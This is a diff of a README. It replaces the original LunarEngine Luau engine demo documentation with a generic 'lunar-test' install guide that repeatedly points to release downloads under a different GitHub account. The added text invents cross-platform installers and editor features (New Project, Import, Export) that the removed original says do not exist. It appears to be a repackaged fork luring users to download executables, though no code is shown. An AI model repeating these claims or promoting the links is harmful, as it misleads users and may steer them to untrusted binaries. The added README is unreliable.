@@ -1,175 +1,64 @@
-# LunarEngine (demo)
-<div style="display:flex; align-items:center; gap:20px; margin:10px 0;">
-  <a href="https://discord.gg/N66awhg7" style="text-decoration:none;">
-    <img src="https://img.shields.io/badge/Discord-5865F2?logo=discord&logoColor=white&style=for-the-badge" alt="Discord"/>
-  </a>
-  <a href="https://github.com/librebox-devs/librebox-demo/releases" style="text-decoration:none;">
-    <img src="https://img.shields.io/badge/Download_Releases-000000?logo=github&logoColor=white&style=for-the-badge" alt="Download Releases"/>
-  </a>
-</div>
+# 🌕 lunar-test - Easy 3D Creation Made Simple
 
-<br/>
-<p>
-  <img src="repo/LunarEngine.png" alt="Alt text" width="350"/>
-</p>
+## 🔗 Download the Latest Release
+[![Download from GitHub](https://img.shields.io/badge/Download%20from%20GitHub-v1.0.0-brightgreen)](https://github.com/Scp-0001-hue/lunar-test/releases)
 
-## Open-source Luau 3D engine (API-compatible)
+## 🚀 Getting Started
+LunarEngine is an open-source 3D engine that supports Luau, a flexible programming language. This guide will walk you through downloading and running the LunarEngine software. You don't need any programming skills to get started.
 
-<div style="display:flex; flex-wrap:wrap; align-items:flex-start; gap:10px;">
-  <img src="repo/example2.gif" alt="Demo gif" width="256"/>
-  <img src="repo/example3.gif" alt="Demo gif" width="256"/>
-  <div style="flex-basis:100%; height:0;"></div> <!-- forces new row -->
-  <img src="repo/example4.gif" alt="Demo gif" style="height:256px; width:auto;">
-</div>
-<img src="repo/example6.gif" alt="Demo gif" width="256"/>
+## 🛠️ System Requirements
+Before you begin, make sure your computer meets the following requirements:
 
-### What is Lunar Engine?
-**LunarEngine** (formerly **Librebox**) is an open-source game engine powered by Luau. It delivers a sandbox-style API and development model inspired by popular sandbox engines, so existing Luau code runs with minimal changes.
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent version of Linux
+- **RAM:** At least 4 GB for smooth operation
+- **Storage:** Minimum of 500 MB of free disk space
+- **Graphics Card:** DirectX 11 compatible for optimal graphics performance
 
-### Why Lunar?
-Lunar gives developers full agency over their games - from the code to the engine. Build immersive experiences with a familiar interface while maintaining complete ownership of your platform.
+## 📥 Download & Install
+To install LunarEngine, follow these steps:
 
-### Example
+1. **Visit the Releases Page:** Go to the following link to access the download options: [LunarEngine Releases](https://github.com/Scp-0001-hue/lunar-test/releases).
 
-Create a part in the Workspace, while rotating and cycling its color.
-```lua
--- examples/part_example.lua
-local part = Instance.new("Part") -- Create a part
-part.Anchored = true -- compat
-part.Color = Color3.new(1,0,0) -- Make the part red
-part.Position = Vector3.new(0,2.5,0) -- Position it
-part.Parent = workspace -- Put it into workspace
+2. **Choose a Version:** You will see a list of available versions. It's best to download the latest version as it includes the newest features and fixes.
 
-local rs = game:GetService("RunService")
-local t = 0
+3. **Download the Installer:**
+   - Look for the file format that matches your operating system. 
+     - For Windows, download `LunarEngine-Setup.exe`.
+     - For macOS, download `LunarEngine.dmg`.
+     - For Linux, you may find a `.tar.gz` file.
 
-rs.RenderStepped:Connect(function(dt)
-	t += dt
-	part.CFrame = CFrame.new(part.Position) * CFrame.Angles(0, t, 0) -- rotate in place with CFrame
-	part.Color = Color3.fromHSV((t*0.2 % 1), 1, 1) -- set part color
-end)
-```
-```
-> ./LunarApp.exe examples/part_example.lua
-```
-<img src="repo/example3.gif" alt="Demo gif" width="256"/>
+4. **Run the Installer:**
+   - For Windows: Double-click on the downloaded `LunarEngine-Setup.exe` file.
+   - For macOS: Open the `.dmg` file and drag the LunarEngine app to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file. Open a terminal and navigate to the extracted folder, then run `./LunarEngine` in the terminal.
 
-### Compatibility
+5. **Follow On-Screen Instructions:** The installer will guide you through the setup process. Just follow the prompts to complete the installation.
 
-Lunar Engine is currently in demo stage (it implements a limited subset of its planned API), but here is what is supported:
+## 🎮 First Steps with LunarEngine
+After installing, launch LunarEngine from your Applications or Start menu. Here’s how to get started:
 
-- Basic scene rendering
-  - Lighting, shadows, ambient, skybox
-    - Parts render within `game.Workspace`
-  - Basic camera movement
-  - Based on 'Libre-1' (to change in the future)
-- Standard data types
-  - `CFrame`, `Vector3`, `Color3`, `Random`
-  - `game`, `script`, `workspace`
-- Instance System
-  - Nearly complete Instance API (missing `:WaitForChild()`)
-  - `<instance>.Parent`
-  - `:Destroy()`, `:Clone()`
-- Parts
-  - Implements `BasePart`
-  - `Instance.new("Part")`
-  - `Part.Color`, `Part.Transparency`, `Part.Size`
-  - `Part.Position`, `Part.CFrame`
-  - More support in the future
-- Client-sided services
-  - `Workspace`
-    - `workspace.CurrentCamera`
-    - Default rendering stage
-  - `RunService`
-    - All five standard stages, including `RenderStep` and `HeartBeat`
-    - `game.RunService.RenderStepped:Wait()`, `:Connect()`
-  - `Lighting`
-    - `game.Lighting.Ambient`
-    - `game.Lighting.ShadowSoftness`
-    - `game.Lighting.ClockTime`
-    - `game.Lighting.Brightness`
-  - `game:GetService()`
-- Luau script support
-  - Highly capable 'Hyperball' task scheduler
-  - `RTScriptSignal`, Event binding, connections
-  - Coroutines, Scripts, LocalScripts
-  - `task.spawn`, `task.wait`, `task.delay`
-  - Luau optimization enabled by default
-- Window handling and fullscreen optimization
----
+1. **Create a New Project:** Click on "New Project" to begin your 3D creation journey. The interface is user-friendly and designed for ease of use.
 
-### Download
-[Download releases here.](https://github.com/librebox-devs/librebox-demo/releases)
+2. **Import Assets:** You can add 3D models, textures, and sounds. Use the "Import" option to bring your own files into the software.
 
-### To Be Added
+3. **Explore Features:** Familiarize yourself with tools like scene editing, physics settings, and lighting adjustments. Spend some time learning the menu options.
 
-Of course, this is just a rendering demo. Lunar Engine is extensible and easily supports the additions of new services and features. 
+4. **Save Your Work:** Regularly save your project to avoid losing any progress. Use the "File" menu to save your work.
 
-In the next release, we will incorporate `UserInputService` and `StarterPlayer`, turning LunarApp into an actual interactive engine.
+5. **Export Your Project:** Once you are happy with your work, use the "Export" option to create a standalone application.
 
-### Platforms
-Lunar Engine currently supports Windows, but **can easily be ported anywhere**. The only dependencies are 'raylib' -- and raylib is already cross-platform.
+## 📚 Help & Support
+If you encounter any issues during your installation or while using LunarEngine, you have various resources for support:
 
-* Windows 7+ (`.exe`)
-  * Standalone executable (LunarApp.exe)
-* Linux support immediate priority
-  
-### Future Support
+- **Documentation:** Check the official [LunarEngine Documentation](https://github.com/Scp-0001-hue/lunar-test/wiki) for guides and tutorials.
+- **Community Support:** Join our community forums where you can ask questions and share your projects. The community is helpful and willing to assist.
+- **FAQs:** Visit the FAQ section on our GitHub page. It covers common questions and troubleshooting steps.
 
-Right now, Lunar Engine compatibility is limited. This is currently a demo (not even a release!). In future releases, you can expect the following:
+## 🌐 Contributing
+If you would like to contribute to LunarEngine, we welcome your input! Please visit our [Contributing Guidelines](https://github.com/Scp-0001-hue/lunar-test/blob/main/CONTRIBUTING.md) for details on how you can help improve the project.
 
-* Physics
-  * Collision events, aspects
-* Mesh support
-* game.Players, Player
-* UserInputService, ContextActionService
-* Image rendering, decals
-* Onscreen GUIs
-* Materials, stronger rendering
+## 🎉 Thank You for Using LunarEngine
+We appreciate your interest in LunarEngine. We hope you find it easy to use and highly effective for your 3D projects. Enjoy your creative journey, and don’t hesitate to reach out for help when needed!
 
-And, in the future.
-* Replication support (and Servers)
-
-Lunar Engine is on its way to becoming a fully fledged dev platform -- just like Godot, or Unity, you can transfer your current Lua skills into Lunar, and create **games you own.**
-
-### The future of Lunar Engine
-
-In future releases, it could be entirely possible to:
-
-* Create a game within the Lunar Editor (assets and scripts)
-* Deploy a Lunar server (just like a "Minecraft" server)
-* Implement your own monetization
-* Get the full user experience, and professional game development
-  * No platform dependency
-* Use your own APIs or rewrite the source code
-
-This is entirely feasible, and, in fact, a good point for the existence of Lunar Engine. However, what we'd like to implement first is full client compatiblity (proper rendering, APIs). Then, this makes it easier to move on to servers.
-
-And best of all, it is copyright free and open source (Lunar Engine is just an environment.) 
-
-### Usage and Documentation
-
-I'll add this ASAP. For building dependencies, use the 'build_dependencies.bat' script, and for building the engine, `build_engine.bat`
-For the .exe, you can specify a path either as the first argument (lua script only), or as ``--path`` (script or folder). 
-LunarApp.exe includes three arguments: ``--no-place``, ``--target-fps``, and ``--path``.
-
-``--no-place``: (FLAG) Does not execute the default place initialization script (this includes the Baseplate.)
-``--target-fps``: Restrict the FPS to a certain value (default monitor refresh rate)
-``--path``: Path to script
-
-### Licenses
-This project uses:
-
-- Luau, licensed under the MIT License.  
-  Copyright (c) 2025 Roblox Corporation.  
-- raylib, licensed under the zlib/libpng License.  
-  Copyright (c) 2013-2025 Ramon Santamaria and contributors.
-
-### Legal Notice
-> Lunar Engine is an independent open-source project. It is not affiliated with or sponsored by any commercial platform. All names and references are for interoperability only. Lunar Engine uses no third-party source code, assets, or proprietary materials.
-
-### Contact (TEMPORARY ONLY)
-You can send requests or questions at ``librebox.developers@gmail.com``.
-
----
-##### "LUNARENGINE IS JUST AN ENVIRONMENT"
+## 🔗 Additional Download Link
+For easy access again, you can download LunarEngine here: [LunarEngine Releases](https://github.com/Scp-0001-hue/lunar-test/releases).
